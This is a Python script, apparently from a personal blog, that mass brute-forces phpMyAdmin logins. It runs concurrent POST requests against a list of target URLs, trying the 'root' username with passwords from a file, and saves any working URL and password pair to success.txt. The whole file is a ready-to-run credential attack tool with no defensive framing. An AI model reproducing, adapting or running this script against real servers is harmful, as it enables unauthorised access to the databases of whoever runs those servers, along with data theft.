# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import asyncio
import aiomultiprocess
import aiohttp
import time
import aiofiles
passwords = [x.strip() for x in open('passwords.txt', 'r').readlines()]
# 密码保存在passwords.txt
async def scan(url):
    async with asyncio.Semaphore(500):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            for password in passwords:
                try:
                    async with session.post(url=url,data={'pma_username': 'root', 'pma_password': password},timeout=20) as resp:
                        print(f'当前爆破  网址 : {url} 用户名 : root : {password}')
                        result = await resp.text()
                        if 'mainFrameset' in result:
                            # 登陆成功后 ，页面会有 mainFrameset这个关键词
                            print('爆破成功')
                            async with aiofiles.open('success.txt', 'a+')as f:
                                await f.write(url + '|root|' + password + '\n')
                            return
                except Exception as e:
                    print(e)
                    pass
async def main():
    urls = [x.strip() for x in open('urls.txt','r').readlines()]
    async with aiomultiprocess.Pool() as pool:
        result = await pool.map(scan,urls)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    start_time = time.time()
    loop.run_until_complete(main())
    print('总耗时:{}'.format(time.time()-start_time))

